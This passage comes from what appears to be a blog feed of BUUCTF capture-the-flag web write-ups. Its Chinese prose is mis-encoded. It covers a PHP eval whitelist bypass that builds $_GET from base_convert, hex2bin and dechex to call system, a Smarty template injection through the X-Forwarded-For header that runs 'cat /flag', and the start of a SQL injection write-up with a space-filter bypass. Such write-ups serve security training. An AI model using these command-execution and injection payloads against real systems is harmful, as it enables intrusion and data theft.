alt="image-20230824130556447"></p><p>åœ¨é¢˜ç›®çš„ç½‘é¡µä¸­è¾“å…¥åæ˜¾ç¤º:<br>![image-20230824130738728](images&#x2F;2023-8-24_Love Math&#x2F;image-20230824130738728.png)</p><p>è¿™æ—¶å·²ç»ç»•è¿‡ç¬¬ä¸€å±‚åˆ¤æ–­ï¼Œæ¥åˆ°ç¬¬äºŒå±‚åˆ¤æ–­:</p><p>4.å¯¹ç¬¬äºŒå±‚åˆ¤æ–­è¿›è¡Œç»•è¿‡:</p><p><strong>å‡½æ•°ä»‹ç»:</strong><br><strong>base_convert()å‡½æ•°(å±äºæ•°å­¦å‡½æ•°):</strong><br><img src="/images/2023-8-24_LoveMath/image-20230824131254523.png" alt="image-20230824131254523"></p><h5 id="hex2bin-String-å‡½æ•°ï¼ˆå±äºå­—ç¬¦ä¸²å‡½æ•°ï¼‰"><a href="#hex2bin-String-å‡½æ•°ï¼ˆå±äºå­—ç¬¦ä¸²å‡½æ•°ï¼‰" class="headerlink" title="hex2bin(String) å‡½æ•°ï¼ˆå±äºå­—ç¬¦ä¸²å‡½æ•°ï¼‰:"></a><strong>hex2bin(String) å‡½æ•°ï¼ˆå±äºå­—ç¬¦ä¸²å‡½æ•°ï¼‰:</strong></h5><p><img src="/images/2023-8-24_LoveMath/image-20230824131526831.png" alt="image-20230824131526831"></p><h5 id="dechex-å‡½æ•°ï¼ˆå±äºæ•°å­¦å‡½æ•°ï¼‰"><a href="#dechex-å‡½æ•°ï¼ˆå±äºæ•°å­¦å‡½æ•°ï¼‰" class="headerlink" title="dechex() å‡½æ•°ï¼ˆå±äºæ•°å­¦å‡½æ•°ï¼‰:"></a><strong>dechex() å‡½æ•°ï¼ˆå±äºæ•°å­¦å‡½æ•°ï¼‰:</strong></h5><p><img src="/images/2023-8-24_LoveMath/image-20230824131746347.png" alt="image-20230824131746347"></p><p>ç°åœ¨çš„payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$_GET&#123;a&#125;($_GET&#123;b&#125;)&amp;a=system&amp;b=ls /<br></code></pre></td></tr></table></figure><p>ç”±äºå‡½æ•°:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">preg_match_all(&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;, $content, $used_funcs);<br></code></pre></td></tr></table></figure><p>å¯¹è¯¥æ­£åˆ™è¡¨è¾¾å¼çš„è§£é‡Š:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs txt">[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*:<br>è¡¨ç¤ºç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ä»¥a-zæˆ–A-Zæˆ–_æˆ–ä¸å¯è§å­—ç¬¦ä¸­çš„ä¸€ä¸ªï¼Œç¬¬äºŒä¸ªå­—ç¬¦æ˜¯a-zæˆ–A-Zæˆ–_æˆ–æ•°å­—æˆ–ä¸å¯è§å­—ç¬¦ä¸­çš„ä¸€ä¸ª<br>ä¸”ç¬¬äºŒä¸ªå­—ç¬¦çš„æƒ…å†µå¯ä»¥å‡ºç°0æ¬¡æˆ–å¤šæ¬¡(ç¬¦åˆPHPå¯¹å˜é‡åçš„è¦æ±‚):<br>å®ä¾‹:<br>a9oo9<br>Aa99o<br>_GET<br>ä¸å¯è§å­—ç¬¦9oooa<br><br>æ‰€ä»¥æ•°å­—å¼€å¤´çš„å­—ç¬¦ä¸²ä¸ä¼šè¢«åŒ¹é…<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æå–çš„æ˜¯contentå­—ç¬¦ä¸²ä¸­æ‰€æœ‰çš„å•è¯ï¼Œæ‰€ä»¥æœ€ç»ˆcontentä¼šè¢«æå–æˆ:GET,a,b</p><p><strong>è¿™äº›å•è¯éƒ½ä¸åŒ…å«åœ¨ç™½åå•ä¸­ï¼Œæ‰€ä»¥è¦å°†è¿™äº›å•è¯è¿›è¡Œæ›¿æ¢(å†…éƒ¨å‡½æ•°åå¯ä»¥è¢«ç”¨ä½œæ˜¯å‚æ•°å)a&#x3D;&gt;abs,b&#x3D;&gt;atan,GETç”±äºæ˜¯è¦å‡½æ•°æ‰§è¡Œï¼Œæ‰€ä»¥æ— æ³•è¢«æ›¿æ¢:</strong><br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$_GET&#123;abs&#125;($_GET&#123;atan&#125;)&amp;abs=system&amp;atan=ls /<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ•°å­¦å‡½æ•°å¯¹$_GETè¿›è¡Œè½¬ç </p><p><strong>36è¿›åˆ¶ä»‹ç»(åŒç†17-35è¿›åˆ¶ï¼Œå°±æ˜¯å°‘äº†ä¸€äº›å­—æ¯):</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">ä¸‰åå…­è¿›åˆ¶ï¼Œæ˜¯æ•°æ®çš„ä¸€ç§è¡¨ç¤ºæ–¹æ³•ã€‚åŒæˆ‘ä»¬æ—¥å¸¸ç”Ÿæ´»ä¸­çš„è¡¨ç¤ºæ³•ä¸ä¸€æ ·ã€‚å®ƒç”±0-9ï¼ŒA-Zç»„æˆï¼Œå­—æ¯ä¸åŒºåˆ†å¤§å°å†™ã€‚ä¸10è¿›åˆ¶çš„å¯¹åº”å…³ç³»æ˜¯ï¼š0-9å¯¹åº”0-9ï¼›A-Zå¯¹åº”10-35<br></code></pre></td></tr></table></figure><p>å®ä¾‹:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs txt">//35=&gt;z<br>print(base_convert(35,10,36).&quot;\n&quot;);<br><br>//37=36+1=&gt;36^1*1+36^0*1=&gt;11<br>print(base_convert(37,10,36).&quot;\n&quot;);<br><br>//9=&gt;9<br>print(base_convert(9,10,36).&quot;\n&quot;);<br><br>//70=&gt;36+34=&gt;36^1*1+36^0*34=&gt;1y<br>print(base_convert(70,10,36).&quot;\n&quot;);<br><br>è¾“å‡º:<br>z<br>11<br>9<br>1y<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å‘ç°é€šè¿‡åè¿›åˆ¶è½¬36è¿›åˆ¶å¯ä»¥è¢«0-9å’Œa-zçš„å­—ç¬¦è¿›è¡Œè¡¨ç¤ºè¾“å‡º36è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªç‰¹å®šçš„åè¿›åˆ¶å€¼ä½¿å…¶è¢«è½¬åŒ–ä¸º36è¿›åˆ¶æ—¶åˆšå¥½æ˜¯å­—ç¬¦ä¸²å‡½æ•°hex2bin:</p><p>å°†36è¿›åˆ¶(36è¿›åˆ¶åŒ…å«æ‰€æœ‰éç‰¹æ®Šå­—ç¬¦ï¼Œå¯ä»¥ç”¨äºè¡¨ç¤ºæ‰€æœ‰ä¸å«ç‰¹æ®Šå­—ç¬¦çš„å‡½æ•°)hex2binè½¬åŒ–ä¸º10è¿›åˆ¶:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">print</span>(<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-string">&quot;hex2bin&quot;</span>,<span class="hljs-number">36</span>,<span class="hljs-number">10</span>).<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-comment">//37907361743</span><br></code></pre></td></tr></table></figure><p>ç”±äº$_GETå‡½æ•°å«æœ‰ç‰¹æ®Šå­—ç¬¦ï¼Œæ‰€ä»¥å¿…é¡»ä½¿ç”¨hex2binå°†16è¿›åˆ¶è½¬åŒ–ä¸ºASCIIç çš„å½¢å¼è¿›è¡Œä»£æ¢</p><p><strong>å°†å­—ç¬¦ä¸²è½¬åŒ–ä¸º16è¿›åˆ¶:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py">s = <span class="hljs-string">&quot;_GET&quot;</span><br>s_hex = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):<br>    s_hex = s_hex+<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(s[i]))[<span class="hljs-number">2</span>:]+<span class="hljs-string">&quot; &quot;</span><br><span class="hljs-built_in">print</span>(s_hex)<br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">5f 47 45 54 <br></code></pre></td></tr></table></figure><p>å‘ç°16è¿›åˆ¶è¡¨ç¤ºä¸­å«æœ‰å­—æ¯ï¼Œæ‰€ä»¥ä¼šè¢«preg_match_all()å‡½æ•°æå–ï¼Œæ‰€ä»¥è¦å°†è¯¥16è¿›åˆ¶è½¬åŒ–ä¸º10è¿›åˆ¶ï¼Œå†ç”±dechex() å°†10è¿›åˆ¶è½¬å›ç»™16è¿›åˆ¶</p><p><strong>16è¿›åˆ¶è½¬10è¿›åˆ¶ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">print</span>(<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-string">&quot;5f474554&quot;</span>,<span class="hljs-number">16</span>,<span class="hljs-number">10</span>).<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-comment">//1598506324</span><br></code></pre></td></tr></table></figure><p>_GETçš„payloadçš„æ„é€ :</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">_GET=hex2bin(&quot;5f474554&quot;)<br>hex2bin=base_convert(&quot;37907361743&quot;,10,36)()<br>&quot;5f474554&quot;=dechex(&quot;1598506324&quot;)<br>_GET=base_convert(&quot;37907361743&quot;,10,36)(dechex(&quot;1598506324&quot;))<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥$_GET{}:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">$(base_convert(&quot;37907361743&quot;,10,36)(dechex(&quot;1598506324&quot;)))&#123;&#125;<br></code></pre></td></tr></table></figure><p>5.æ„é€ payload</p><p>åŸæ¥çš„payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$_GET&#123;abs&#125;($_GET&#123;atan&#125;)&amp;abs=system&amp;atan=ls /<br></code></pre></td></tr></table></figure><p>è½¬æ¢payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$(base_convert(&quot;37907361743&quot;,10,36)(dechex(&quot;1598506324&quot;)))&#123;abs&#125;($(base_convert(&quot;37907361743&quot;,10,36)(dechex(&quot;1598506324&quot;)))&#123;atan&#125;)&amp;abs=system&amp;atan=ls /<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-24_LoveMath/image-20230824143815219.png" alt="image-20230824143815219"></p><p>ç”±äºcçš„é•¿åº¦å¤ªé•¿æ‰€ä»¥å¿…é¡»ç®€åŒ–payload</p><p>æµ‹è¯•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test1&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;111&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag is here&quot;</span>;<br><span class="hljs-comment">//$pi=base_convert(37907361743,10,36)(dechex(1598506324));</span><br><span class="hljs-comment">//($$pi)&#123;a&#125;(($$pi)&#123;b&#125;);</span><br><span class="hljs-comment">//($_GET&#123;a&#125;)($_GET&#123;b&#125;);</span><br><span class="hljs-variable">$base_convert</span>(<span class="hljs-string">&quot;37907361743&quot;</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-string">&quot;1598506324&quot;</span>))&#123;a&#125;(<span class="hljs-variable">$base_convert</span>(<span class="hljs-string">&quot;37907361743&quot;</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-string">&quot;1598506324&quot;</span>))&#123;b&#125;);<br></code></pre></td></tr></table></figure><p>è¾“å‡ºï¼š<br><img src="/images/2023-8-24_LoveMath/image-20230824152553792.png" alt="image-20230824152553792"></p><p>å‘ç°ç³»ç»Ÿå‘½ä»¤æ²¡æœ‰è¢«æ‰§è¡Œï¼Œæ‰€ä»¥ç›´æ¥åº”ç”¨çš„æ–¹å¼æ˜¯é”™è¯¯çš„ï¼Œæˆ‘ä»¬éœ€è¦é‡‡ç”¨é—´æ¥å¼•ç”¨å­—ç¬¦ä¸²çš„æ–¹å¼ï¼š</p><p><strong>æµ‹è¯•:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test1&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;111&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag is here&quot;</span>;<br><span class="hljs-variable">$_GET</span>&#123;a&#125;(<span class="hljs-variable">$_GET</span>&#123;b&#125;);<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?a=system&amp;b=dir<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-24_LoveMath/image-20230824144645504.png" alt="image-20230824144645504"></p><p>å‘ç”Ÿäº†è¾“å‡ºï¼Œè¯´æ˜system(dir)åœ¨æ²¡æœ‰echoçš„æƒ…å†µä¸‹ä¾ç„¶å¯ä»¥è¾“å‡ºå†…å®¹</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ å¤šå¥åˆæ³•PHPä»£ç ä½¿å…¶å­˜åœ¨äºeval()å‡½æ•°ä¸­ï¼Œä½¿è¯¥å‡½æ•°æ‰§è¡Œå¤šæ¡PHPä»£ç ï¼Œç„¶åæˆ‘ä»¬åœ¨å¯¹å…¶è¿›è¡Œæ³¨å…¥ï¼ˆç±»ä¼¼äºæ’å…¥ä¸€å¥è¯æœ¨é©¬ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test1&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;111&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag is here&quot;</span>;<br><span class="hljs-comment">//$pi=base_convert(37907361743,10,36)(dechex(1598506324));</span><br><span class="hljs-comment">//($$pi)&#123;a&#125;(($$pi)&#123;b&#125;);</span><br><span class="hljs-comment">//($_GET&#123;a&#125;)($_GET&#123;b&#125;);</span><br><span class="hljs-variable">$pi</span>=<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-string">&quot;37907361743&quot;</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-string">&quot;1598506324&quot;</span>));<br><span class="hljs-variable">$$pi</span>&#123;a&#125;(<span class="hljs-variable">$$pi</span>&#123;b&#125;);<br></code></pre></td></tr></table></figure><p>è¾“å‡º:<br><img src="/images/2023-8-24_LoveMath/image-20230824152828967.png" alt="image-20230824152828967"></p><p>6.ç”¨é—´æ¥å¼•ç”¨ç®€åŒ–payload(ä½¿ç”¨piä½œä¸ºå‚æ•°æ˜¯å› ä¸ºå®ƒæ—¢æ˜¯ç™½åå•å­—ç¬¦ä¸²ï¼ŒåŒæ—¶ä¹Ÿå¾ˆçŸ­):</p><p>åœ¨PHPå‡½æ•°çš„å‚æ•°ä¸­stringç±»å‹éƒ½å¯ä»¥ä¸ç”¨åŠ åŒå¼•å·æˆ–å•å¼•å·ï¼ŒPHPä¼šè‡ªåŠ¨è¿›è¡Œè§£æ,åŒæ—¶ç”¨GETæˆ–POSTæ–¹æ³•ä¼ è¾“å†…å®¹æ—¶ä¹Ÿä¸éœ€è¦â€â€å’Œâ€™â€™:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;atan&#125;);&amp;abs=system&amp;atan=ls /<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-24_LoveMath/image-20230824153549268.png" alt="image-20230824153549268"></p><p>å‘ç°flagæ–‡ä»¶ï¼Œå°†å…¶æ‰“å¼€æŸ¥çœ‹:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;atan&#125;);&amp;abs=system&amp;atan=cat /flag<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-24_LoveMath/image-20230824153729500.png" alt="image-20230824153729500"></p><p>flag &#x3D; flag{26bb1d2a-6719-409c-88f7-14461687b994}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[CISCN2019 åä¸œå—èµ›åŒº]Web11 é¢˜è§£</title>
    <link href="/2023/08/23/2023-08-23-%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb11/"/>
    <url>/2023/08/23/2023-08-23-%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb11/</url>
    
    <content type="html"><![CDATA[<h2 id="CISCN2019-åä¸œå—èµ›åŒº-Web11"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web11" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web11"></a>[CISCN2019 åä¸œå—èµ›åŒº]Web11</h2><p>1.æ‰“å¼€ç½‘é¡µåè§‚å¯Ÿ:</p><p><img src="/images/2023-8-23_Web11/image-20230823120850043.png" alt="image-20230823120850043"></p><p>æ ¹æ®ç½‘é¡µæ˜¾ç¤ºçš„å†…å®¹å¾—ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦å¯¹ç½‘é¡µçš„è¯·æ±‚å¤´è¿›è¡Œæ›´æ”¹</p><p>2.BPæŠ“åŒ…:<br><img src="/images/2023-8-23_Web11/image-20230823121029643.png" alt="image-20230823121029643"></p><p>ç”±ç½‘é¡µæ˜¾ç¤ºçš„å†…å®¹å¾—ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦ä¿®æ”¹headersä¸­çš„X-Forwarded-For</p><p>å¯¹è¯¥å­—æ®µè¿›è¡Œä¿®æ”¹ï¼Œå…ˆéšä¾¿å†™ä¸€ä¸ªIPï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:127.0.0.1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-23_Web11/image-20230823121206963.png" alt="image-20230823121206963"></p><p>æˆ‘ä»¬è¾“å…¥çš„å†…å®¹åœ¨ç½‘é¡µçš„Current IPä¸­æ˜¾ç¤ºï¼Œå³æˆ‘ä»¬è¾“å…¥çš„å†…å®¹å¯ä»¥è¢«æ¸²æŸ“ä¼ é€åˆ°htmlä¸­æ˜¾ç¤ºï¼Œæ‰€ä»¥çŒœæµ‹è¯¥å­—æ®µå­˜åœ¨sstiæ³¨å…¥</p><p>3.åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¨¡æ¿æ³¨å…¥:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:&#123;&#123;8*8&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-23_Web11/image-20230823121359664.png" alt="image-20230823121359664"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&#123;&#123;&#125;&#125;ä¸­çš„ä»£ç è¢«æ‰§è¡Œè¾“å‡º64ï¼Œæ‰€ä»¥è¯¥å­—æ®µå­˜åœ¨sstiæ³¨å…¥<br></code></pre></td></tr></table></figure><p>4.åˆ¤æ–­è¯¥æ¨¡æ¿çš„ç±»å‹:<br>ç”¨åˆ¤æ–­æ˜¯å¦ä¸ºSmartyæ¨¡æ¿æ³¨å…¥:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:&#123;&#123;$smarty.version&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-23_Web11/image-20230823121632709.png" alt="image-20230823121632709"></p><p>çˆ†å‡ºç‰ˆæœ¬ä¿¡æ¯:3.1.30,æ‰€ä»¥è¯¥ç½‘é¡µä½¿ç”¨çš„æ˜¯smartyæ¨¡æ¿</p><p>5.ä½¿ç”¨sstiåœ¨Smartyæ¨¡æ¿ä¸­çš„æ¶æ„ä»£ç :<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:&#123;&#123;system(&quot;ls /&quot;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-23_Web11/image-20230823121828541.png" alt="image-20230823121828541"></p><p>å‘ç°æœ‰ä¸€ä¸ªflagæ–‡ä»¶ï¼ŒæŸ¥çœ‹flagæ–‡ä»¶çš„å†…å®¹:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:&#123;&#123;system(&quot;cat /flag&quot;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-23_Web11/image-20230823121932270.png" alt="image-20230823121932270"></p><p>flag&#x3D;flag{0f8c1a6e-bf4c-4d5e-ad9e-f6282d3fe876}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[SWPU2019]Web1 é¢˜è§£</title>
    <link href="/2023/08/23/2023-08-23-%5BSWPU2019%5DWeb1/"/>
    <url>/2023/08/23/2023-08-23-%5BSWPU2019%5DWeb1/</url>
    
    <content type="html"><![CDATA[<h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>1.ç‚¹å‡»ç½‘é¡µä¹‹åï¼Œæ³¨å†Œä¸€ä¸ªè´¦æˆ·ï¼Œç„¶åç™»å½•(ç™»å½•ç•Œé¢å’Œæ³¨å†Œç•Œé¢çš„sqlæ³¨å…¥å·²ç»æµ‹è¯•ï¼Œå‘ç°æ²¡æœ‰ç”¨):<br><img src="/images/2023-08-23_Web1/image-20230823141144322.png" alt="image-20230823141144322"></p><p>2.ç‚¹å‡»ç”³è¯·ä¸€ä¸ªå¹¿å‘Š:</p><p><img src="/images/2023-08-23_Web1/image-20230823141243172.png" alt="image-20230823141243172"></p><p>åœ¨è¯¥é¡µé¢ä¸­ä¹Ÿå­˜åœ¨ç–‘ä¼¼æ³¨å…¥ç‚¹ï¼Œå…ˆéšæœºç”³è¯·ä¸€ä¸ªå¹¿å‘Š:<br><img src="/images/2023-08-23_Web1/image-20230823141351148.png" alt="image-20230823141351148"></p><p>3.ç‚¹å‡»å¹¿å‘Šè¯¦æƒ…:<br><img src="/images/2023-08-23_Web1/image-20230823141456102.png" alt="image-20230823141456102"></p><p>æ˜¾ç¤ºäº†è¯¥å¹¿å‘Šçš„å†…å®¹</p><p>4.çŒœæµ‹è¯¥é¡µé¢çš„äº‹åŠ¡å¤„ç†é€»è¾‘ï¼š<br><strong>ç”³è¯·å¹¿å‘Šé¡µé¢:</strong></p><p>insert into table VALUES(â€œå¹¿å‘Šåâ€,â€å¹¿å‘Šå†…å®¹â€,â€¦â€¦..);</p><p><strong>index.phpæ˜¾ç¤ºå†…å®¹ï¼š</strong><br>select * from table</p><p><strong>å¹¿å‘Šè¯¦æƒ…é¡µé¢:</strong></p><p>select * from table where å¹¿å‘Šå &#x3D;â€™ä»ç•Œé¢åˆ—è¡¨ä¸­è·å–çš„å¹¿å‘Šåâ€™</p><p><strong>éªŒè¯çŒœæµ‹ï¼š</strong></p><p>åœ¨ç”³è¯·å¹¿å‘Šé¡µé¢ä¸­:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">å¹¿å‘Šå:1&#x27;<br>å¹¿å‘Šå†…å®¹:aaaaa<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823142529330.png" alt="image-20230823142529330"></p><p>ç‚¹å‡»å¹¿å‘Šè¯¦æƒ…:<br><img src="/images/2023-08-23_Web1/image-20230823142551729.png" alt="image-20230823142551729"></p><p>å‘ç”ŸsqlæŠ¥é”™ï¼Œæ‰€ä»¥å¯ä»¥è¯å®æˆ‘ä»¬çš„çŒœæƒ³ï¼Œå¹¿å‘Šè¯¦æƒ…å­˜åœ¨sqlæ³¨å…¥æ¼æ´:<br>select * from table where å¹¿å‘Šå &#x3D;â€™1â€™â€™</p><p>5.sqlæ³¨å…¥:<br><strong>ç¬¬ä¸€æ­¥ï¼Œçˆ†å­—æ®µï¼š</strong></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27; union select 1,2,3 #<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823143036837.png" alt="image-20230823143036837"></p><p>å‘ç°å¯¹è¾“å…¥å†…å®¹è¿›è¡Œäº†è¿‡æ»¤,å¯¹è¾“å…¥å†…å®¹è¿›è¡Œåˆ¤æ–­ï¼Œçœ‹çœ‹å®ƒè¿‡æ»¤äº†å“ªäº›å†…å®¹:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27; union<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823143210775.png" alt="image-20230823143210775"></p><p>å¯ä»¥è¿›è¡Œç”³è¯·ï¼Œä½†æ˜¯åœ¨æ˜¾ç¤ºçš„å†…å®¹ä¸­ç©ºæ ¼è¢«æ¶ˆé™¤äº†ï¼Œè¯´æ˜ç½‘é¡µå¯¹ç©ºæ ¼è¿›è¡Œäº†å¤„ç†:<br><strong>å¯¹ç©ºæ ¼è¿›è¡Œç»•è¿‡:</strong><br><img src="/images/2023-08-23_Web1/image-20230823143443665.png" alt="image-20230823143443665"></p><p>æ‰€ä»¥ç©ºæ ¼å¯ä»¥ç”¨&#x2F;**&#x2F;ä»£æ›¿</p><p><img src="/images/2023-08-23_Web1/image-20230823144042281.png" 